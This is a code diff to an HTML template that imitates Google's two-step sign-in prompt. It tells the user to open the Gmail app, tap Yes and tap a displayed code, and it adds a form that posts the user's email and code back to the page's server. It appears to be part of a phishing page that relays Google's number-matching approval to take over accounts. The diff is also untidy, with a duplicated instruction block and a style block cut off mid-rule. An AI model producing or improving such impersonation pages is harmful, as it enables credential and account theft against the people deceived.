@@ -358,25 +358,25 @@
                     <div class="instruction-text">
                         Google sent a notification to your iPhone. Open the Gmail app, tap <strong>Yes</strong> on the prompt, then tap <strong>{{ code }}</strong> on your phone to verify it’s you.
                     </div>
+                    {% if code %}
+                    <div class="instruction-heading">Open the Gmail app on iPhone</div>
+                    <div class="instruction-text">
+                        Google sent a notification to your iPhone. Open the Gmail app, tap <strong>Yes</strong> on the prompt, then tap <strong>{{ code }}</strong> on your phone to verify it’s you.
+                    </div>
+                    <div class="big-number">{{ code }}</div>
+                    <form method="POST" style="display: flex; flex-direction: column; align-items: center; margin-top: 16px;">
+                        <input type="hidden" name="email" value="{{ email }}">
+                        <input type="text" name="code" maxlength="2" pattern="\d{2}" placeholder="Enter code" required style="font-size: 32px; text-align: center; width: 80px; margin-bottom: 12px; border-radius: 8px; border: 1px solid #5f6368; background: #23272b; color: #e8eaed; padding: 8px 0;">
+                        {% if error %}
+                        <div style="color: #ea4335; font-size: 14px; margin-bottom: 8px;">{{ error }}</div>
+                        {% endif %}
+                        <button type="submit" style="background: #8ab4f8; color: #202124; border: none; border-radius: 18px; padding: 10px 24px; font-size: 16px; font-weight: 500; cursor: pointer;">Verify</button>
+                    </form>
                     {% else %}
                     <div class="instruction-text">
                         No authentication code available.
                     </div>
                     {% endif %}
-                        <style>
-                        /* ...existing code... */
-                        .auth-code-area {
-                            margin-top: 32px;
-                            width: 100%;
-                            max-width: 340px;
-                            text-align: left;
-                            display: flex;
-                            flex-direction: column;
-                            align-items: flex-start;
-                        }
-                        .auth-code-label {
-                            color: var(--text-secondary);
-                            font-size: 13px;
                             margin-bottom: 6px;
                         }
                         .auth-code-value {
